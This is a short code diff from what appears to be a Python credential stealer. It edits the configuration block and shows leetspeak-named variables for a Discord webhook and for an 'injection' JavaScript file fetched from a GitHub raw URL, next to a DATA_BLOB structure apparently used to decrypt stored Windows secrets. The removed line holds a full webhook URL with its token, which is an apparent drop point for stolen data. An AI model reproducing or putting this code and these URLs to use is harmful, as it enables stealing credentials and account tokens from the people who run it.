@@ -71,7 +71,7 @@ for module in ModuleRequirements:
 
 
 
-h00k = "https://discord.com/api/webhooks/1237876103436042240/VYzKik4B-A-NJUkG4Xz4urfWwbir4m4IaKaryynLo8PnmHXZBdQG-8-jekmMLtI5Y2GA"
+h00k = ""
 inj3c710n_url = f"https://raw.githubusercontent.com/Ayhuuu/injection/main/index.js"
 
 class DATA_BLOB(Structure):
